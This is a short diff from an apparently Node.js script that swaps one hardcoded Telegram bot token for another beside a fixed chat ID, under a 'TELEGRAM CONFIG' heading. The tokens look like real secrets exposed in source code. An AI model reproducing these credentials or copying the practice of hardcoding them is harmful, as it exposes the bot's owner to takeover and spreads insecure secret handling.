@@ -21,7 +21,7 @@ try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
 // ── ✅ TELEGRAM CONFIG ──
-const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
+const BOT_TOKEN = '8210158119:AAHhshMpvVybY3LSxOZkYiiuLwtq_dwaCLg';
 const CHAT_ID = '7310383191';
 
 // ── ✅ DASHBOARD AUTH ──
